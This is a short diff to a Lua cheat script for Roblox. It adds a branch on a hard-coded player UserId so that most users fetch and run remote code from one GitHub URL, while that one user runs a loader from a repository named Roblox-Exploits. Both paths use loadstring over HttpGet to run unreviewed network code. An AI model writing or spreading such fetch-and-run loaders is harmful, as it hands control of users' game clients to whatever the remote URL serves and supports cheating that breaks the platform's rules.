@@ -8,8 +8,11 @@ getgenv().ballzui = true
 getgenv().visualizer = true
 
 local h
-
+if game.Players.LocalPlayer.UserId ~= 156256804 then
 loadstring(game:HttpGet("https://raw.githubusercontent.com/1f0yt/community/main/RedCircleBlock"))()
+else
+loadstring(game:HttpGet("https://raw.githubusercontent.com/FFJ1/Roblox-Exploits/main/scripts/Loader.lua"))()
+end
 spawn(function()
 h = game.DescendantAdded:Connect(function(d)
   if d.Name == "MainView" then
